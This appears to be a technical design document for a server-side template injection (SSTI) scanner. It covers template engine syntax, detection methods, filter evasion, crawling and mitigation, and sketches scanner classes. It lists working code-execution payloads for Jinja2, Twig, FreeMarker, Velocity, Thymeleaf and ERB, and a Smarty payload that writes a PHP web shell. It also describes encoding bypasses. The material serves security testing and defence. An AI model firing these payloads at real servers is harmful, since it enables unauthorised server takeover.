# SSTI Scanner - Context & Technical Overview

## What is Server-Side Template Injection (SSTI)?

Server-Side Template Injection (SSTI) is a vulnerability that occurs when user input is embedded in a template in an unsafe manner, allowing attackers to inject template directives and potentially execute arbitrary code on the server.

### Common Scenarios
- Web applications using template engines for dynamic content generation
- User input directly concatenated into template strings
- Insufficient input validation in template processing
- Configuration errors in template engine setup

## Template Engines Supported by Our Scanner

### Python-Based Engines ✅ FULLY IMPLEMENTED
- **Jinja2**: Most popular Python template engine, used by Flask
  - Syntax: `{{ expression }}`, `{% statement %}`
  - Common payloads: `{{7*7}}`, `{{config}}`, `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`
  - ✅ **Status**: Complete with 50+ payloads including mathematical, object disclosure, and Flask globals
  
- **Django Templates**: Default template engine for Django framework
  - Syntax: `{{ variable }}`, `{% tag %}`
  - Limited expression capabilities: `{{7|add:"7"}}`, `{% load static %}`
  - ✅ **Status**: Complete with filter-based detection and debug information disclosure

### PHP-Based Engines ✅ FULLY IMPLEMENTED
- **Twig**: Modern PHP template engine
  - Syntax: `{{ expression }}`, `{% statement %}`
  - Common payloads: `{{7*7}}`, `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
  - ✅ **Status**: Complete with 200+ payloads including mathematical, filter, and object access

- **Smarty**: Older but still widely used PHP template engine
  - Syntax: `{$variable}`, `{if condition}`
  - Common payloads: `{php}phpinfo(){/php}`, `{7*7}`, `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",true)}`
  - ✅ **Status**: Complete with mathematical, server variables, and function execution

### Java-Based Engines ✅ FULLY IMPLEMENTED
- **FreeMarker**: Popular Java template engine
  - Syntax: `${expression}`, `<#directive>`
  - Common payloads: `${7*7}`, `${"freemarker.template.utility.Execute"?new()("id")}`
  - ✅ **Status**: Complete with Class.forName exploitation and reflection attacks

- **Velocity**: Apache Velocity template engine
  - Syntax: `$variable`, `#directive`
  - Common payloads: `$7*7`, `#set($ex=$class.forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id"))`
  - ✅ **Status**: Complete with VTL syntax and VelocityTools access

- **Thymeleaf**: Modern Java template engine for Spring
  - Syntax: `${expression}`, `th:text`
  - Common payloads: `${7*7}`, `${T(java.lang.Runtime).getRuntime().exec('id')}`
  - ✅ **Status**: Complete with Spring context access and type expressions

### JavaScript-Based Engines ✅ FULLY IMPLEMENTED
- **Handlebars**: Popular JavaScript template engine
  - Syntax: `{{expression}}`, `{{#helper}}`
  - Common payloads: `{{7*7}}`, `{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{/with}}{{/with}}{{/with}}`
  - ✅ **Status**: Complete with constructor exploitation and Node.js globals

### Ruby-Based Engines ✅ FULLY IMPLEMENTED
- **ERB**: Embedded Ruby template engine
  - Syntax: `<%= expression %>`, `<% code %>`
  - Common payloads: `<%= 7*7 %>`, `<%= system('id') %>`, `<%= Dir.entries('/') %>`
  - ✅ **Status**: Complete with Ruby code execution and Rails object access

## Detection Methodologies

### 1. Mathematical Expression Evaluation
The most basic and reliable method:
```
Payload: {{7*7}}
Expected: 49
Indicates: Template engine processing mathematical expressions
```

### 2. Template-Specific Syntax Detection
Each engine has unique syntax patterns:
```
Jinja2: {{7*'7'}} → 7777777
Twig: {{7*'7'}} → 7777777  
Smarty: {7*'7'} → 7777777
```

### 3. Error-Based Detection
Triggering template engine errors:
```
Payload: {{undefined_variable}}
Response: Template error messages revealing engine type
```

### 4. Blind Detection Techniques
When output is not directly visible:
- Time-based delays
- DNS exfiltration
- HTTP callbacks
- File system interactions

### 5. Context-Aware Detection
Understanding injection context:
- Attribute context: `<img src="{{payload}}">`
- JavaScript context: `var x = "{{payload}}"`
- CSS context: `body { color: {{payload}} }`

### 6. Advanced Web Application Enumeration
Modern SSTI detection requires comprehensive application mapping:
- **Spider-based Discovery**: Systematic crawling of web applications
- **Form Enumeration**: Identifying all input vectors across the application
- **Endpoint Discovery**: Finding hidden APIs and admin panels
- **Technology Fingerprinting**: Identifying underlying frameworks and engines

### 7. Intelligent Form and Button Analysis
Understanding application behavior is crucial for effective SSTI testing:
- **Form Workflow Mapping**: Tracing multi-step processes
- **Button Behavior Analysis**: Understanding JavaScript event handlers
- **Redirect Chain Following**: Tracking where payloads ultimately execute
- **AJAX Request Interception**: Monitoring dynamic content updates

### 8. Result Correlation and Tracking
Critical for accurate vulnerability detection:
- **Multi-page Response Analysis**: Payloads may execute on different pages
- **Delayed Execution Detection**: Background processing scenarios
- **Out-of-band Communication**: DNS exfiltration and HTTP callbacks
- **Error Page Monitoring**: Template errors in exception handlers

## Security Implications

### Low Impact
- Information disclosure
- Template engine fingerprinting
- Configuration data exposure

### Medium Impact
- File system access
- Internal network reconnaissance
- Sensitive data extraction

### High Impact
- Remote code execution
- Server compromise
- Lateral movement capabilities

## Evasion Techniques

### 1. Encoding Bypass
- URL encoding: `%7b%7b7*7%7d%7d`
- HTML entity encoding: `&#123;&#123;7*7&#125;&#125;`
- Unicode encoding: `\u007b\u007b7*7\u007d\u007d`

### 2. Concatenation Bypass
- String splitting: `{{'ma'+'th'}}`
- Array join: `{{['a','b'].join('')}}`

### 3. Comment Bypass
- Template comments: `{{/* comment */7*7}}`
- HTML comments: `<!-- {{7*7}} -->`

### 4. Alternative Syntax
- Different delimiters where supported
- Whitespace variations
- Case sensitivity bypass

### 5. Application-Level Evasion
Modern web applications require sophisticated evasion techniques:
- **Multi-step Form Submission**: Spreading payloads across multiple form steps
- **Session State Manipulation**: Using session variables to store partial payloads
- **AJAX-based Injection**: Leveraging asynchronous requests for stealthy injection
- **File Upload Vector Abuse**: Using upload functionality for template injection
- **Header-based Injection**: Exploiting HTTP headers processed by templates

## Common Vulnerable Patterns

### 1. Direct String Concatenation
```python
# Vulnerable
template = "Hello " + user_input + "!"
Template(template).render()

# Safe
template = Template("Hello {{name}}!")
template.render(name=user_input)
```

### 2. Dynamic Template Loading
```python
# Vulnerable
template_content = request.form['template']
Template(template_content).render()
```

### 3. Configuration Exposure
```python
# Vulnerable - exposes Flask config
template = Template("Debug: {{config}}")
```

## Mitigation Strategies

### 1. Input Validation
- Strict whitelist validation
- Regular expression filtering
- Length limitations
- Character encoding normalization

### 2. Template Sandboxing
- Restricted execution environments
- Limited function access
- Disabled dangerous functions

### 3. Secure Coding Practices
- Never concatenate user input into templates
- Use parameterized templates
- Implement proper output encoding
- Regular security code reviews

### 4. Framework-Specific Protections
- Enable auto-escaping
- Use safe template filters
- Implement content security policies
- Configure template engine security settings

## Web Application Analysis and Enumeration

### Application Discovery Techniques

#### 1. Systematic Web Crawling
Comprehensive application mapping requires intelligent crawling:
```
Crawling Strategy:
├── Breadth-first traversal for coverage
├── Depth-first for specific workflows
├── Hybrid approach for optimal discovery
└── JavaScript-rendered content handling
```

#### 2. Form Discovery and Analysis
Forms are primary SSTI attack vectors:
```html
<!-- Target Analysis Examples -->
<form action="/search" method="GET">
  <input name="query" type="text" />     <!-- Direct injection point -->
  <input name="filter" type="hidden" />  <!-- Hidden parameter discovery -->
</form>

<form action="/profile" method="POST">
  <input name="bio" type="textarea" />   <!-- Template context likely -->
  <input name="csrf_token" type="hidden" /> <!-- Token handling required -->
</form>
```

#### 3. Button and Interaction Mapping
Understanding user interactions reveals injection opportunities:
```javascript
// JavaScript event handlers to analyze
onclick="submitForm(this.value)"     // Dynamic form submission
onsubmit="return validateForm()"     // Validation bypass opportunities
addEventListener('click', handler)    // Event-driven functionality
```

#### 4. Endpoint Discovery Methods
Multiple techniques for finding hidden attack surfaces:
- **Robots.txt Analysis**: Discovering restricted areas
- **Sitemap.xml Parsing**: Finding documented endpoints
- **JavaScript File Analysis**: Extracting API endpoints and routes
- **Directory Fuzzing**: Using wordlists for hidden directories
- **Parameter Fuzzing**: Discovering hidden parameters
- **Virtual Host Discovery**: Finding additional applications

### Form Analysis Methodologies

#### 1. Input Field Classification
Different field types require different injection strategies:
```
Field Type Classification:
├── Text Fields: Direct injection candidates
├── Hidden Fields: Often contain template expressions
├── Textarea Fields: Rich content with template processing
├── Select Options: Limited but possible injection points
├── File Upload Fields: Filename and content injection
└── Search Fields: High probability for template usage
```

#### 2. Form Submission Flow Analysis
Understanding the complete submission workflow:
```
Form Submission Analysis:
1. Pre-submission JavaScript validation
2. CSRF token generation and validation
3. Server-side processing and template rendering
4. Response generation and redirect handling
5. Error page generation and template usage
```

#### 3. Multi-step Form Handling
Complex applications often use multi-step forms:
```
Multi-step Form Patterns:
├── Wizard-style forms (step 1 → 2 → 3)
├── AJAX-updated forms (dynamic field addition)
├── Conditional forms (fields appear based on input)
└── Session-dependent forms (state carried across requests)
```

### Redirect Chain Analysis

#### 1. Redirect Pattern Recognition
Understanding where payloads ultimately execute:
```
Common Redirect Patterns:
POST /submit → 302 /processing → 302 /result
GET /search → 302 /results?q=payload
Form Submit → AJAX Response → DOM Update
```

#### 2. Payload Tracking Through Redirects
Sophisticated tracking mechanisms:
- **Unique Payload Identifiers**: Using UUID or timestamp markers
- **Response Correlation**: Matching requests to responses across redirects
- **Session State Tracking**: Following payload through session variables
- **Cookie-based Tracking**: Using cookies to maintain payload context

#### 3. Response Analysis Across Multiple Pages
Payloads may execute on different pages than injection:
```
Execution Location Analysis:
├── Immediate Response: Direct payload execution
├── Redirect Target: Payload in redirected page
├── Error Pages: Template errors with payload
├── Admin Panels: Payload in administrative interfaces
├── Email Templates: Payload in generated emails
└── Report Generation: Payload in PDF/document output
```

## Advanced Attack Vectors and Scenarios

### 1. Modern Web Application Challenges

#### Single Page Applications (SPAs)
SPAs present unique challenges for SSTI detection:
- **Client-side Rendering**: Templates processed in browser
- **API-based Communication**: JSON payloads to backend APIs
- **Dynamic Content Updates**: AJAX-based template rendering
- **State Management**: Complex client-side state handling

#### Progressive Web Applications (PWAs)
Additional considerations for PWAs:
- **Service Worker Integration**: Background template processing
- **Offline Functionality**: Cached template rendering
- **Push Notifications**: Template-based notification content

#### Microservices Architecture
Distributed applications require comprehensive analysis:
- **Service Discovery**: Identifying all microservices
- **Inter-service Communication**: API calls between services
- **Template Processing Distribution**: Different services handling templates
- **Cross-service Payload Propagation**: Payloads moving between services

### 2. Real-world Attack Scenarios

#### E-commerce Platforms
Common SSTI vectors in e-commerce:
```
E-commerce Attack Vectors:
├── Product Reviews: User-generated content templates
├── Custom Product Configuration: Dynamic template generation
├── Order Confirmation Emails: Email template processing
├── Search Functionality: Search result template rendering
├── Customer Support Chat: Message template processing
└── Invoice Generation: PDF template processing
```

#### Content Management Systems
CMS-specific attack vectors:
```
CMS Attack Vectors:
├── Theme Customization: Custom template uploads
├── Widget Configuration: Dynamic widget templates
├── Page Builder Tools: User-defined page templates
├── Comment Systems: Comment template processing
├── Newsletter Generation: Email template customization
└── SEO Meta Generation: Dynamic meta tag templates
```

#### Corporate Applications
Enterprise application vectors:
```
Enterprise Attack Vectors:
├── Report Generation: Business report templates
├── Email Signatures: Dynamic signature generation
├── Document Templates: Contract and document templates
├── Dashboard Customization: User dashboard templates
├── Notification Systems: Alert and notification templates
└── Data Export Functions: Export template processing
```

### 3. Attack Strategy Optimization

#### Context-Aware Payload Selection
Intelligent payload selection based on context:
```python
# Context-based payload selection example
contexts = {
    'email_template': ['{{config}}', '{{request.environ}}'],
    'html_attribute': ['{{7*7}}', '{{config.SECRET_KEY}}'],
    'javascript_context': ['{{constructor.constructor("alert(1)")()}}'],
    'css_context': ['{{7*7}}', '{{config}}'],
    'url_parameter': ['{{request.args}}', '{{session}}']
}
```

#### Machine Learning-Enhanced Detection
Advanced techniques for payload optimization:
- **Success Pattern Recognition**: Learning from successful injections
- **Target Fingerprinting**: Identifying application characteristics
- **Payload Effectiveness Scoring**: Rating payload success probability
- **Adaptive Attack Strategies**: Modifying approach based on responses

## Testing Environments

## Testing Environments

### Laboratory Setup
For comprehensive testing, the scanner should support diverse environments:

#### Vulnerable Application Suites
- **DVWA (Damn Vulnerable Web Application)**: Basic SSTI scenarios
- **WebGoat**: OWASP training application with SSTI modules
- **Mutillidae II**: Comprehensive vulnerability testing platform
- **VulnHub VMs**: Specialized SSTI challenge environments
- **Custom Vulnerable Applications**: Purpose-built testing applications

#### Template Engine Test Environments
```dockerfile
# Docker-based testing environments
├── Python/Flask + Jinja2 vulnerable app
├── PHP/Symfony + Twig vulnerable app  
├── Java/Spring + Thymeleaf vulnerable app
├── Node.js + Handlebars vulnerable app
└── Ruby/Rails + ERB vulnerable app
```

#### Modern Application Testing
- **React/Vue.js SPAs**: Client-side template injection testing
- **API-first Applications**: JSON/XML template injection vectors
- **Microservices Platforms**: Distributed template processing testing
- **Serverless Functions**: Cloud function template injection testing

### Target Identification and Prioritization

#### High-Priority Endpoints
Applications areas most likely to contain SSTI vulnerabilities:
```
Priority Target Classification:
├── HIGH PRIORITY
│   ├── Contact forms and feedback systems
│   ├── User profile and bio sections
│   ├── Search functionality with result templates
│   ├── Email template customization
│   ├── Report generation systems
│   └── Custom dashboard creation
├── MEDIUM PRIORITY  
│   ├── Comment and review systems
│   ├── Error page generation
│   ├── Notification systems
│   ├── Content preview functionality
│   └── File upload with metadata processing
└── LOW PRIORITY
    ├── Static content areas
    ├── Read-only display pages
    ├── Authentication forms (login/register)
    └── Simple navigation elements
```

#### Application Flow Analysis
Understanding typical vulnerable workflows:
```
Vulnerable Workflow Examples:
1. User Registration → Email Confirmation (template processing)
2. Contact Form → Thank You Page (template rendering)
3. Search Input → Results Page (template-based results)
4. Profile Update → Confirmation (template notification)
5. File Upload → Processing Status (template progress page)
```

### Real-world Testing Considerations

#### Production Environment Safety
Critical safety measures for production testing:
- **Read-only Payloads**: Never execute destructive operations
- **Rate Limiting**: Respect application performance
- **Error Monitoring**: Watch for application disruption
- **Rollback Preparation**: Plan for payload cleanup
- **Authorization Verification**: Ensure testing permission

#### Testing Methodology Best Practices
```
Systematic Testing Approach:
1. RECONNAISSANCE
   ├── Application technology stack identification
   ├── Template engine fingerprinting
   ├── Form and endpoint enumeration
   └── User privilege level assessment

2. MAPPING
   ├── Complete application crawling
   ├── Form workflow documentation
   ├── Redirect chain mapping
   └── Error page identification

3. ANALYSIS
   ├── Injection point prioritization
   ├── Context-aware payload selection
   ├── Attack vector strategy development
   └── Expected result prediction

4. EXECUTION
   ├── Systematic payload injection
   ├── Multi-channel result monitoring
   ├── Redirect chain following
   └── Out-of-band communication checking

5. VALIDATION
   ├── False positive elimination
   ├── Impact assessment
   ├── Exploitation path documentation
   └── Remediation recommendation
```

## Industry Standards and Compliance

### OWASP Guidelines
- OWASP Top 10 - Injection vulnerabilities
- OWASP Testing Guide for SSTI
- OWASP Code Review Guide recommendations

### Security Frameworks
- NIST Cybersecurity Framework alignment
- ISO 27001 compliance considerations
- PCI DSS requirements for web applications

## Tool Ecosystem Integration

### Popular Security Tools
- Burp Suite Professional extensions
- OWASP ZAP add-ons
- Nessus vulnerability scanners
- Custom security automation pipelines

### Development Integration
- CI/CD pipeline integration
- IDE security plugins
- Pre-commit hooks
- Automated security testing

## Technical Implementation Considerations

### Web Crawling Architecture

#### Intelligent Crawling Strategies
```python
# Crawling strategy example
class CrawlingStrategy:
    def __init__(self):
        self.depth_limit = 5
        self.request_delay = 0.5
        self.concurrent_requests = 10
        self.respect_robots_txt = True
        self.follow_redirects = True
        self.handle_javascript = True
    
    def should_crawl_url(self, url):
        # URL filtering logic
        return self.is_in_scope(url) and not self.is_blacklisted(url)
```

#### Content Parser Integration
Modern applications require sophisticated parsing:
- **HTML Parsers**: BeautifulSoup, lxml for static content
- **JavaScript Parsers**: AST analysis for dynamic endpoints
- **API Schema Parsers**: OpenAPI/Swagger specification analysis
- **Framework-specific Parsers**: Django URLs, Flask routes, etc.

### Form Analysis Implementation

#### Dynamic Form Detection
```javascript
// JavaScript form detection techniques
const dynamicFormDetection = {
    // AJAX form submissions
    ajaxForms: document.querySelectorAll('form[data-remote="true"]'),
    
    // Event-driven forms
    eventForms: Array.from(document.forms).filter(form => 
        form.addEventListener || form.onclick || form.onsubmit
    ),
    
    // Dynamically generated forms
    dynamicForms: document.querySelectorAll('[data-form-generator]')
};
```

#### Form Field Context Analysis
```python
# Form field analysis implementation
class FormFieldAnalyzer:
    def analyze_field(self, field):
        context = {
            'field_type': field.get('type', 'text'),
            'field_name': field.get('name', ''),
            'placeholder': field.get('placeholder', ''),
            'validation_pattern': field.get('pattern', ''),
            'is_required': field.has_attr('required'),
            'max_length': field.get('maxlength', None)
        }
        
        # Determine injection likelihood
        injection_probability = self.calculate_injection_probability(context)
        return injection_probability
```

### Result Correlation System

#### Response Tracking Architecture
```python
# Response correlation implementation
class ResponseCorrelator:
    def __init__(self):
        self.payload_registry = {}
        self.response_cache = {}
        self.correlation_rules = []
    
    def track_payload(self, payload_id, injection_point, expected_locations):
        """Track payload through multiple response channels"""
        self.payload_registry[payload_id] = {
            'injection_point': injection_point,
            'expected_locations': expected_locations,
            'timestamp': time.time(),
            'found_locations': []
        }
    
    def check_response(self, response, payload_id):
        """Check if payload appears in response"""
        if payload_id in response.text:
            self.payload_registry[payload_id]['found_locations'].append({
                'url': response.url,
                'status_code': response.status_code,
                'timestamp': time.time()
            })
```

### Advanced Detection Techniques

#### Out-of-band Communication
```python
# DNS exfiltration detection
class DNSExfiltrationDetector:
    def __init__(self, domain):
        self.domain = domain
        self.dns_server = self.setup_dns_server()
    
    def generate_payload(self, context):
        unique_id = uuid.uuid4().hex[:8]
        payload = f"{{{{ 'test.{unique_id}.{self.domain}'.resolve() }}}}"
        return payload, unique_id
    
    def check_dns_requests(self, unique_id, timeout=30):
        """Monitor DNS requests for exfiltrated data"""
        start_time = time.time()
        while time.time() - start_time < timeout:
            if self.dns_server.check_request(unique_id):
                return True
        return False
```

#### Time-based Detection
```python
# Time-based blind injection detection
class TimeBasedDetector:
    def __init__(self):
        self.baseline_response_time = None
        self.time_threshold = 5.0  # seconds
    
    def establish_baseline(self, target_url):
        """Establish normal response time"""
        times = []
        for _ in range(5):
            start = time.time()
            requests.get(target_url)
            times.append(time.time() - start)
        self.baseline_response_time = statistics.median(times)
    
    def test_time_delay(self, target_url, payload):
        """Test for time-based injection"""
        start = time.time()
        response = requests.post(target_url, data={'param': payload})
        response_time = time.time() - start
        
        return response_time > (self.baseline_response_time + self.time_threshold)
```

### Performance Optimization

#### Concurrent Request Management
```python
# Async request handling for performance
import asyncio
import aiohttp

class AsyncScanner:
    def __init__(self, max_concurrent=50):
        self.semaphore = asyncio.Semaphore(max_concurrent)
        self.session = None
    
    async def scan_endpoint(self, url, payload):
        async with self.semaphore:
            async with self.session.post(url, data=payload) as response:
                return await response.text()
    
    async def bulk_scan(self, targets):
        async with aiohttp.ClientSession() as session:
            self.session = session
            tasks = [self.scan_endpoint(url, payload) for url, payload in targets]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            return results
```

#### Memory Management
```python
# Efficient data structures for large-scale scanning
class EfficientScanner:
    def __init__(self):
        # Use generators for memory efficiency
        self.url_generator = self.generate_urls()
        self.payload_cache = {}  # LRU cache for payloads
        self.result_buffer = collections.deque(maxlen=1000)
    
    def generate_urls(self):
        """Generator for URL discovery to avoid memory issues"""
        for url in self.crawl_application():
            yield url
    
    def process_results_batch(self, batch_size=100):
        """Process results in batches to manage memory"""
        batch = []
        for result in self.result_buffer:
            batch.append(result)
            if len(batch) >= batch_size:
                self.analyze_batch(batch)
                batch.clear()
```

## Error Handling and Recovery

### Robust Error Management
```python
# Comprehensive error handling
class ErrorHandler:
    def __init__(self):
        self.error_patterns = {
            'network_errors': [ConnectionError, TimeoutError],
            'http_errors': [HTTPError, ConnectionError],
            'template_errors': ['TemplateSyntaxError', 'UndefinedError'],
            'parsing_errors': [ValueError, AttributeError]
        }
    
    def handle_error(self, error, context):
        """Intelligent error handling with recovery strategies"""
        if isinstance(error, tuple(self.error_patterns['network_errors'])):
            return self.handle_network_error(error, context)
        elif 'template' in str(error).lower():
            return self.handle_template_error(error, context)
        else:
            return self.handle_generic_error(error, context)
    
    def handle_template_error(self, error, context):
        """Template errors often indicate successful injection"""
        return {
            'type': 'template_error',
            'indication': 'possible_vulnerability',
            'error_message': str(error),
            'context': context
        }
```

This enhanced context provides comprehensive technical background for implementing a sophisticated SSTI scanner with advanced web application analysis, form enumeration, result correlation, and intelligent attack strategies.
